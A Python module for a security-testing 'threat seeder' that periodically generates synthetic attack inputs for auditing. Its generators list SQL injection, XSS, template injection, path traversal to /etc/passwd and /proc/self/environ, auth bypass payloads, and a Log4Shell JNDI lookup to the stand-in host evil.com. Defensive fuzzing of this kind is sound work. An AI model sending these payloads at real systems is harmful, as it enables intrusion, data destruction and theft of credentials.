"""
Procedural Threat-Seeding Engine - Continuous security auditing pipeline injecting synthetic edge cases
"""
import threading
import random
import time
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
from collections import deque


class ThreatCategory(Enum):
    INJECTION = "injection"
    OVERFLOW = "overflow"
    TRAVERSAL = "traversal"
    AUTH_BYPASS = "auth_bypass"
    RACE_CONDITION = "race_condition"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    LOGIC_FLAW = "logic_flaw"
    CRYPTO_WEAKNESS = "crypto_weakness"


@dataclass
class ThreatSeed:
    seed_id: str
    category: ThreatCategory
    description: str
    payload: Any
    target_component: str
    severity: float
    metadata: Dict[str, Any] = field(default_factory=dict)
    created_at: float = field(default_factory=time.time)


class ThreatSeeder:
    def __init__(self, seeding_rate: float = 0.1):
        self.seeding_rate = seeding_rate
        self._seeds: List[ThreatSeed] = []
        self._lock = threading.RLock()
        self._generators: Dict[ThreatCategory, Callable] = {}
        self._register_generators()
        self._active = False
        self._seed_thread: Optional[threading.Thread] = None
    
    def _register_generators(self):
        self._generators = {
            ThreatCategory.INJECTION: self._gen_injection,
            ThreatCategory.OVERFLOW: self._gen_overflow,
            ThreatCategory.TRAVERSAL: self._gen_traversal,
            ThreatCategory.AUTH_BYPASS: self._gen_auth_bypass,
            ThreatCategory.RACE_CONDITION: self._gen_race_condition,
            ThreatCategory.RESOURCE_EXHAUSTION: self._gen_resource_exhaustion,
            ThreatCategory.LOGIC_FLAW: self._gen_logic_flaw,
            ThreatCategory.CRYPTO_WEAKNESS: self._gen_crypto_weakness,
        }
    
    def start(self):
        if self._active:
            return
        self._active = True
        self._seed_thread = threading.Thread(target=self._seed_loop, daemon=True)
        self._seed_thread.start()
    
    def stop(self):
        self._active = False
        if self._seed_thread:
            self._seed_thread.join(timeout=5.0)
    
    def _seed_loop(self):
        while self._active:
            if random.random() < self.seeding_rate:
                self.generate_random_seed()
            time.sleep(1.0)
    
    def generate_random_seed(self) -> ThreatSeed:
        category = random.choice(list(ThreatCategory))
        return self.generate_seed(category)
    
    def generate_seed(self, category: ThreatCategory, target: str = "") -> ThreatSeed:
        generator = self._generators.get(category)
        if not generator:
            return None
        
        payload, desc, severity = generator()
        
        seed = ThreatSeed(
            seed_id=f"seed_{int(time.time() * 1000)}",
            category=category,
            description=desc,
            payload=payload,
            target_component=target,
            severity=severity
        )
        
        with self._lock:
            self._seeds.append(seed)
            if len(self._seeds) > 10000:
                self._seeds = self._seeds[-10000:]
        
        return seed
    
    def _gen_injection(self) -> tuple:
        payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "' OR '1'='1",
        ]
        return random.choice(payloads), "Injection attempt", random.uniform(0.7, 1.0)
    
    def _gen_overflow(self) -> tuple:
        sizes = [1000, 10000, 100000, 1000000]
        payload = "A" * random.choice(sizes)
        return payload, "Buffer overflow attempt", random.uniform(0.6, 0.9)
    
    def _gen_traversal(self) -> tuple:
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/environ",
            "file:///etc/passwd",
        ]
        return random.choice(payloads), "Path traversal attempt", random.uniform(0.7, 1.0)
    
    def _gen_auth_bypass(self) -> tuple:
        payloads = [
            {"username": "admin", "password": "' OR '1'='1"},
            {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."},
            {"role": "admin", "bypass": True},
        ]
        return random.choice(payloads), "Auth bypass attempt", random.uniform(0.8, 1.0)
    
    def _gen_race_condition(self) -> tuple:
        return {"concurrent_requests": 100, "target": "shared_resource"}, "Race condition trigger", random.uniform(0.5, 0.8)
    
    def _gen_resource_exhaustion(self) -> tuple:
        return {"memory_mb": 1000, "cpu_percent": 95, "duration": 30}, "Resource exhaustion", random.uniform(0.6, 0.9)
    
    def _gen_logic_flaw(self) -> tuple:
        return {"condition": "always_true", "expected": "false"}, "Logic flaw", random.uniform(0.4, 0.7)
    
    def _gen_crypto_weakness(self) -> tuple:
        return {"algorithm": "MD5", "key_size": 512}, "Weak cryptography", random.uniform(0.7, 0.9)
    
    def get_seeds(self, limit: int = 100, category: ThreatCategory = None) -> List[ThreatSeed]:
        with self._lock:
            seeds = list(self._seeds)
        
        if category:
            seeds = [s for s in seeds if s.category == category]
        
        return seeds[-limit:]


_threat_seeder: Optional[ThreatSeeder] = None

def get_threat_seeder() -> ThreatSeeder:
    global _threat_seeder
    if _threat_seeder is None:
        from ..core.config import config
        rate = config.get_param("threat", "threat_seeding_rate", 0.1)
        _threat_seeder = ThreatSeeder(seeding_rate=rate)
        _threat_seeder.start()
    return _threat_seeder